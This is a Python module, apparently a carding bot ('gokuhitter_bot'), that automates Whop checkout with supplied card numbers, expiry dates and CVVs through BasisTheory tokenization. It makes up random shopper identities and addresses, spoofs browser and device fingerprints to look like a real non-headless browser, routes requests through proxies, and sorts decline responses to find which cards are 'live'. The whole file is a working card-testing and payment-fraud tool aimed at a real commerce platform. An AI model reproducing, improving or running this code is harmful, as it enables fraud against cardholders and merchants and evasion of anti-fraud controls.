"""
Whop Payment Engine (gokuhitter_bot)
───────────────────────────────────
Modern Whop checkout engine utilizing BasisTheory PCI vault tokenization,
anti-detect canvas/device fingerprinting, and Whop API v1 checkout orchestration.
"""

import re
import json
import time
import base64
import random
import hashlib
import asyncio
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_cffi.requests import AsyncSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BT_API_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
WHOP_API_BASE = "https://api.whop.com/api/v1"

GLOBAL_SHOPPERS = {
    'US': {
        'first_names': ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Ava'],
        'last_names': ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Moore'],
        'cities': [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'), ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'), ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'), ('Austin', 'TX', '78701')],
        'streets': ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St'],
        'phone_prefix': '+1',
    },
    'GB': {
        'first_names': ['Oliver', 'George', 'Harry', 'Noah', 'Jack', 'Leo', 'Arthur', 'Oscar', 'Olivia', 'Amelia', 'Isla', 'Ava', 'Mia', 'Lily', 'Sophia', 'Grace'],
        'last_names': ['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies', 'Robinson', 'Wright', 'Thompson', 'Evans', 'Walker', 'White'],
        'cities': [('London', 'Greater London', 'EC1A 1BB'), ('Manchester', 'Greater Manchester', 'M1 1AE'), ('Birmingham', 'West Midlands', 'B1 1AA'), ('Leeds', 'West Yorkshire', 'LS1 1UR'), ('Glasgow', 'Scotland', 'G1 1XQ'), ('Liverpool', 'Merseyside', 'L1 8JQ'), ('Bristol', 'Bristol', 'BS1 4ST')],
        'streets': ['High Street', 'Station Road', 'Main Street', 'Church Lane', 'Victoria Road', 'Green Lane', 'Manor Road', 'Park Road', 'Queen Street'],
        'phone_prefix': '+44',
    },
    'DE': {
        'first_names': ['Lukas', 'Maximilian', 'Paul', 'Felix', 'Jonas', 'Leon', 'Finn', 'Noah', 'Elias', 'Emma', 'Mia', 'Hannah', 'Sophia', 'Anna', 'Emilia', 'Marie'],
        'last_names': ['Müller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker', 'Schulz', 'Hoffmann', 'Schäfer', 'Koch', 'Bauer', 'Richter'],
        'cities': [('Berlin', 'Berlin', '10115'), ('Munich', 'Bavaria', '80331'), ('Hamburg', 'Hamburg', '20095'), ('Frankfurt', 'Hesse', '60311'), ('Cologne', 'North Rhine-Westphalia', '50667'), ('Stuttgart', 'Baden-Württemberg', '70173'), ('Düsseldorf', 'North Rhine-Westphalia', '40213')],
        'streets': ['Hauptstraße', 'Bahnhofstraße', 'Schillerstraße', 'Goethestraße', 'Berliner Straße', 'Gartenstraße', 'Bismarckstraße', 'Kirchstraße'],
        'phone_prefix': '+49',
    },
    'CA': {
        'first_names': ['Liam', 'Noah', 'Oliver', 'Lucas', 'Benjamin', 'Theodore', 'William', 'Olivia', 'Emma', 'Charlotte', 'Amelia', 'Sophia', 'Chloe', 'Mia'],
        'last_names': ['Smith', 'Brown', 'Tremblay', 'Martin', 'Roy', 'Wilson', 'MacDonald', 'Gagnon', 'Johnson', 'Taylor', 'Campbell', 'Anderson', 'Leblanc'],
        'cities': [('Toronto', 'ON', 'M5H 2N2'), ('Vancouver', 'BC', 'V6B 1A1'), ('Montreal', 'QC', 'H2Y 1C6'), ('Calgary', 'AB', 'T2P 1J9'), ('Ottawa', 'ON', 'K1P 1J1'), ('Edmonton', 'AB', 'T5J 0N3')],
        'streets': ['Yonge Street', 'Queen Street West', 'Robson Street', 'Sainte-Catherine St', 'Jasper Ave', 'Bay Street', 'King Street', 'Main Street'],
        'phone_prefix': '+1',
    },
    'AU': {
        'first_names': ['Oliver', 'Noah', 'Henry', 'William', 'Jack', 'Charlie', 'Thomas', 'Charlotte', 'Amelia', 'Isla', 'Olivia', 'Mia', 'Ava', 'Grace'],
        'last_names': ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson', 'Thompson', 'Nguyen', 'Thomas'],
        'cities': [('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'), ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000'), ('Gold Coast', 'QLD', '4217')],
        'streets': ['George Street', 'Collins Street', 'Queen Street', 'Bourke Street', 'St Kilda Road', 'Pitt Street', 'Flinders Street', 'Elizabeth Street'],
        'phone_prefix': '+61',
    }
}

DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me', 'mail.com']

def _generate_random_shopper(country_code: Optional[str] = None) -> dict:
    if not country_code or country_code.upper() not in GLOBAL_SHOPPERS:
        country_code = 'US'
    else:
        country_code = country_code.upper()
        
    data = GLOBAL_SHOPPERS[country_code]
    first = random.choice(data['first_names'])
    last = random.choice(data['last_names'])
    num = random.randint(10, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    
    city, state, zip_code = random.choice(data['cities'])
    street_name = random.choice(data['streets'])
    house_num = str(random.randint(10, 999))
    street = f"{house_num} {street_name}"
    phone = f"{data['phone_prefix']}{random.randint(2000000000, 9999999999)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code
    }

def _get_device_fingerprint():
    screen_w = random.choice([1920, 2560, 1440, 1366])
    screen_h = int(screen_w * random.choice([0.5625, 0.625, 0.6]))
    inner_h = screen_h - random.randint(50, 150)
    dev_info = {
        "uaBrands": [
            {"brand": "Chromium", "version": "131"},
            {"brand": "Not_A Brand", "version": "24"},
            {"brand": "Google Chrome", "version": "131"},
        ],
        "uaMobile": False,
        "uaPlatform": "Windows",
        "languages": ["en-US"],
        "timeZone": "America/New_York",
        "cookiesEnabled": True,
        "localStorageEnabled": True,
        "sessionStorageEnabled": True,
        "platform": "Win32",
        "hardwareConcurrency": random.choice([4, 8, 12, 16]),
        "deviceMemoryGb": random.choice([8, 16, 32]),
        "screenWidth": screen_w,
        "screenHeight": screen_h,
        "screenAvailWidth": screen_w,
        "screenAvailHeight": screen_h,
        "innerWidth": random.randint(800, 1400),
        "innerHeight": inner_h,
        "devicePixelRatio": round(random.uniform(1.0, 2.0), 2),
        "maxTouchPoints": 0,
        "plugins": [
            "PDF Viewer",
            "Chrome PDF Viewer",
            "Chromium PDF Viewer",
            "Microsoft Edge PDF Viewer",
            "WebKit built-in PDF"
        ],
        "mimeTypes": ["application/pdf", "text/pdf"],
        "webdriver": False,
        "suspectedHeadless": False,
        "webglVendor": "Google Inc. (NVIDIA)",
        "webglRenderer": f"ANGLE (NVIDIA, NVIDIA GeForce RTX {random.choice([3060, 3070, 3080, 4070, 4080])} Direct3D11 vs_5_0 ps_5_0, D3D11)",
    }
    b64_info = base64.b64encode(json.dumps(dev_info).encode()).decode()
    return dev_info, b64_info

class WhopHitter:
    """Whop Modern Checkout & Digital Marketplace Gateway Engine via BasisTheory."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient_funds": "insufficient_funds",
        "insufficient funds": "insufficient_funds",
        "expired_card": "expired_card",
        "invalid_number": "invalid_number",
        "incorrect_cvc": "incorrect_cvc",
        "invalid_cvc": "incorrect_cvc",
        "fraud": "fraud",
        "restricted_card": "restricted_card",
        "issuer_unavailable": "issuer_unavailable",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _parse_url(self) -> Tuple[Optional[str], Optional[str]]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        path_parts = [p for p in parsed.path.split("/") if p]
        plan_id = None
        for p in path_parts:
            if p.startswith("plan_"):
                plan_id = p
                break
        session_id = params.get("session", [None])[0]
        return plan_id, session_id

    async def _scrape(self, session: AsyncSession) -> dict:
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'merchant': 'Whop Merchant',
            'product_id': None,
            'plan_id': None,
            'account_id': None,
            'amount': None,
            'currency': 'USD',
            'email': None,
        }

        plan_id_url, _ = self._parse_url()
        if plan_id_url:
            cfg['plan_id'] = plan_id_url

        try:
            res = await session.get(self.url, headers=hdr, timeout=15)
            html = res.text if hasattr(res, 'text') else str(res.content)

            # 1. Resolve Account ID (biz_...)
            biz_m = re.search(r"biz_[A-Za-z0-9]+", html)
            if biz_m:
                cfg['account_id'] = biz_m.group(0)

            # 2. Resolve Plan ID if not found in URL path
            if not cfg['plan_id']:
                plan_m = re.search(r"plan_[A-Za-z0-9_]{10,24}", html)
                if plan_m:
                    cfg['plan_id'] = plan_m.group(0)

            # 3. Resolve Email if embedded
            email_m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
            if email_m:
                cfg['email'] = email_m.group(1)

            # 4. Merchant Title / Brand
            og_title = re.search(r'<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']', html, re.I)
            if og_title:
                clean_t = og_title.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                if clean_t:
                    cfg['merchant'] = clean_t[:35]
            else:
                title_m = re.search(r'<title>([^<]+)</title>', html, re.I)
                if title_m:
                    clean_t = title_m.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                    if clean_t:
                        cfg['merchant'] = clean_t[:35]
        except Exception:
            pass

        return cfg

    def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
        try:
            d = json.loads(text)
            if isinstance(d, dict):
                result['raw_response'] = d
                pay = d.get('payment') or {}
                status = pay.get('status') or d.get('status') or ''

                if status in ('succeeded', 'paid', 'complete', 'active') or d.get('success') is True:
                    result['success'] = True
                    result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                    return result

                if status in ('requires_action', 'requires_source_action') or 'next_action' in d or 'next_action' in pay:
                    result['decline_code'] = '3ds_required'
                    result['error'] = '3DS Authentication Required'
                    result['is_live'] = True
                    next_act = d.get('next_action') or pay.get('next_action') or {}
                    redirect_url = next_act.get('redirect_to_url', {}).get('url')
                    if redirect_url:
                        result['redirect_url'] = redirect_url
                    return result

                err = d.get('last_confirm_error') or d.get('error') or d.get('message')
                if isinstance(err, dict):
                    msg = err.get('message') or err.get('code') or 'Card declined'
                    dec_code = err.get('decline_code') or err.get('code') or 'card_declined'
                else:
                    msg = str(err) if err else 'Card declined'
                    dec_code = 'card_declined'

                for k, v in self.DECLINE_MAP.items():
                    if k in msg.lower():
                        dec_code = v
                        break

                result['decline_code'] = dec_code
                result['error'] = msg
                result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable', '3ds_required')
                return result
        except Exception:
            pass

        text_low = text.lower()
        if any(term in text_low for term in ['payment successful', 'order confirmed', 'thank you for your purchase', 'membership active', 'access granted']):
            result['success'] = True
            return result

        if any(term in text_low for term in ['3d secure', '3ds', 'requires_action', 'authenticate']):
            result['decline_code'] = '3ds_required'
            result['error'] = '3DS Authentication Required'
            result['is_live'] = True
            return result

        if 'insufficient funds' in text_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'insufficient_funds'
            result['is_live'] = True
            return result

        if 'cvc' in text_low or 'cvv' in text_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'incorrect_cvc'
            result['is_live'] = True
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your card was declined.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Whop Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp='whop',
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with AsyncSession(impersonate="chrome131", proxies=proxies, timeout=30) as sess:
                # ── 1. Scrape & Init Plan Details ────────────────────────────
                cfg = await self._scrape(sess)
                result['merchant'] = cfg.get('merchant', 'Whop Merchant')

                plan_id = cfg.get('plan_id')
                if not plan_id:
                    result['decline_code'] = 'invalid_plan'
                    result['error'] = 'Unable to resolve Whop Plan ID from link.'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                shopper = _generate_random_shopper('US')
                shopper_email = cfg.get('email') or shopper['email']

                # ── 2. Create Whop Checkout Session ──────────────────────────
                whop_headers = {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Api-Version-Date": "2026-08-25-2",
                    "Whop-Private-Schema": "true",
                    "X-Fern-Language": "JavaScript",
                    "X-Fern-Runtime": "browser",
                    "X-Fern-Runtime-Version": UA,
                    "User-Agent": UA,
                    "Origin": "https://whop.com",
                    "Referer": self.url,
                }

                r_cs = await sess.post(
                    f"{WHOP_API_BASE}/checkout_sessions",
                    headers=whop_headers,
                    json={"items": [{"plan": plan_id, "quantity": 1}]},
                    timeout=20
                )
                if r_cs.status_code not in (200, 201):
                    result['decline_code'] = 'session_failed'
                    result['error'] = f'Whop checkout_session creation failed ({r_cs.status_code})'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                cs_data = r_cs.json()
                checkout_id = cs_data.get("id")
                client_secret_full = cs_data.get("client_secret", "")
                account_id = cs_data.get("seller", {}).get("id") or cfg.get('account_id')

                # Quote & amount discovery
                items = cs_data.get("items") or []
                if items and isinstance(items[0], dict):
                    cfg['merchant'] = items[0].get("name") or result['merchant']
                    result['merchant'] = cfg['merchant']
                total_val = cs_data.get("quote", {}).get("breakdown", {}).get("total", {}).get("amount")
                currency = cs_data.get("quote", {}).get("currency", "USD").upper()
                if total_val is not None:
                    result['amount'] = f"{currency} {total_val}"

                # ── 3. BasisTheory PCI Vault Initialization ─────────────────
                dev_info, bt_device_info = _get_device_fingerprint()

                bt_session_body = {"deviceInfo": dev_info}
                r_btsess = await sess.post(
                    "https://js.basistheory.com/api/sessions",
                    headers={
                        "Accept": "*/*",
                        "bt-api-key": BT_API_KEY,
                        "Content-Type": "application/json",
                        "Origin": "https://js.basistheory.com",
                        "User-Agent": UA,
                    },
                    json=bt_session_body,
                    timeout=15
                )
                if r_btsess.status_code not in (200, 201):
                    result['decline_code'] = 'bt_session_failed'
                    result['error'] = f'BasisTheory session initialization failed ({r_btsess.status_code})'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                bt_sess_data = r_btsess.json()
                nonce = bt_sess_data.get("nonce")
                ssk = bt_sess_data.get("session_key")
                container_hash = hashlib.sha256(nonce.encode()).hexdigest()

                # ── 4. Card Tokenization into Vault ─────────────────────────
                clean_pan = re.sub(r'\D', '', str(card.get('card', '')))
                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
                exp_m_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
                exp_y_int = int(f"20{clean_y}") if len(clean_y) == 2 else int(clean_y or 2028)
                clean_cvv = str(card.get('cvv', '123')).strip()

                token_body = {
                    "type": "card",
                    "containers": [f"/card-assembly/{container_hash}/"],
                    "expiresAt": "2026-08-28T16:00:00.000Z",
                    "data": {
                        "number": clean_pan,
                        "expiration_month": exp_m_int,
                        "expiration_year": exp_y_int,
                        "cvc": clean_cvv,
                    },
                }

                r_tok = await sess.post(
                    "https://js.basistheory.com/api/tokens",
                    headers={
                        "Accept": "*/*",
                        "bt-api-key": BT_API_KEY,
                        "bt-device-info": bt_device_info,
                        "Content-Type": "application/json",
                        "Origin": "https://js.basistheory.com",
                        "User-Agent": UA,
                    },
                    json=token_body,
                    timeout=20
                )
                if r_tok.status_code not in (200, 201):
                    result['decline_code'] = 'tokenization_failed'
                    result['error'] = f'BasisTheory card tokenization failed ({r_tok.status_code})'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                token_id = r_tok.json().get("id")

                # ── 5. Bind Payment Method Session in Whop ───────────────────
                await sess.post(
                    f"{WHOP_API_BASE}/payment_method_types/card/session",
                    headers={**whop_headers, "X-Ssk": ssk},
                    json={"account_id": account_id, "nonce": nonce},
                    timeout=15
                )

                # ── 6. Create Confirmation Token ────────────────────────────
                conf_token_body = {
                    "account_id": account_id,
                    "setup_future_usage": "off_session",
                    "payment_method": {
                        "type": "card",
                        "category": "card",
                        "card": {"token": token_id},
                    },
                    "billing_details": {
                        "email": shopper_email,
                        "name": shopper['full_name'],
                        "address": {
                            "country": shopper['country'],
                            "line1": shopper['street'],
                            "city": shopper['city'],
                            "state": shopper['state'],
                            "postal_code": shopper['postal_code'],
                        },
                    },
                    "return_url": self.url,
                    "browser_info": {
                        "platform": "Win32",
                        "color_depth": 24,
                        "screen_height": dev_info['screenHeight'],
                        "screen_width": dev_info['screenWidth'],
                        "javascript_enabled": True,
                        "language": "en-US",
                        "java_enabled": False,
                        "browser_time_difference": -300,
                    },
                }

                r_ct = await sess.post(
                    f"{WHOP_API_BASE}/confirmation_tokens",
                    headers={
                        **whop_headers,
                        "Authorization": "Bearer public",
                        "X-Ssk": ssk,
                    },
                    json=conf_token_body,
                    timeout=20
                )
                ct_json = r_ct.json() if r_ct.status_code in (200, 201) else {}
                confirmation_token = ct_json.get("id") or ct_json.get("token") or ct_json.get("confirmation_token")

                if not confirmation_token:
                    result['decline_code'] = 'conf_token_failed'
                    result['error'] = f'Whop confirmation token generation failed ({r_ct.status_code})'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                # ── 7. Confirm Checkout Session ─────────────────────────────
                confirm_body = {
                    "client_secret": client_secret_full,
                    "confirmation_token": confirmation_token,
                    "attestations": {"tos_accepted": True},
                }

                r_confirm = await sess.post(
                    f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}/confirm",
                    headers={**whop_headers, "X-Ssk": ssk},
                    json=confirm_body,
                    timeout=30
                )
                conf_resp_text = r_confirm.text if hasattr(r_confirm, 'text') else str(r_confirm.content)
                parsed = self._parse_response(conf_resp_text, r_confirm.status_code, result)

                # ── 8. Async Polling Fallback if Still Processing ────────────
                if not parsed.get('success') and not parsed.get('decline_code') and not parsed.get('error'):
                    for _ in range(4):
                        await asyncio.sleep(2.5)
                        r_poll = await sess.get(
                            f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}",
                            params={"client_secret": client_secret_full},
                            headers={**whop_headers, "X-Ssk": ssk},
                            timeout=20
                        )
                        poll_text = r_poll.text if hasattr(r_poll, 'text') else str(r_poll.content)
                        parsed = self._parse_response(poll_text, r_poll.status_code, result)
                        if parsed.get('success') or parsed.get('decline_code'):
                            break

                result['response_time'] = round(time.time() - t0, 2)
                return result

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result

